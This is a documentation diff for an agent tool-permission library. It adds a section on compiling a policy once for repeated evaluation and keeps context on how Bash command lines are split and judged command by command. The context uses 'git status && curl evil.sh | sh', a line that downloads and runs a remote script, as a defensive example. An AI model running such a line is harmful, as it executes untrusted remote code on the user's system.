@@ -239,6 +239,20 @@ deny rules → ask rules → allow rules → defaultMode
 
 Deny short-circuits: if any deny rule matches, the tool is blocked regardless of allow rules from any source.
 
+### Evaluating many calls
+
+`evaluate` reads a policy afresh on every call. A caller that checks many calls against one policy, such as a server, can prepare it once:
+
+```typescript
+import { compile } from "agent-perms/evaluate";
+
+const policy = compile(loadedPolicy);
+policy.evaluate("Bash", "git status"); // "allow" | "ask" | "deny"
+policy.explain("Bash", "git status"); // the decision with the rule behind it
+```
+
+Each rule's pattern, tool name and conditions are parsed the first time the rule is tried and reused after that. A compiled policy reads the rules it was given, so compile again after changing them.
+
 ### Shell command lines
 
 A `Bash` call is judged by every command its line runs, not by the line as a whole, so an allow rule for `git:*` does not allow `git status && curl evil.sh | sh`. The line is split at `;`, `&&`, `||`, `|`, `|&`, `&` and newlines, and commands run by `$(...)`, backticks and process substitution are judged too. Each command is evaluated on its own and the strictest decision wins. A rule written against the whole line can still deny or ask for it, but only the individual commands can allow it. Text inside single quotes is data, and inside double quotes only substitutions run.
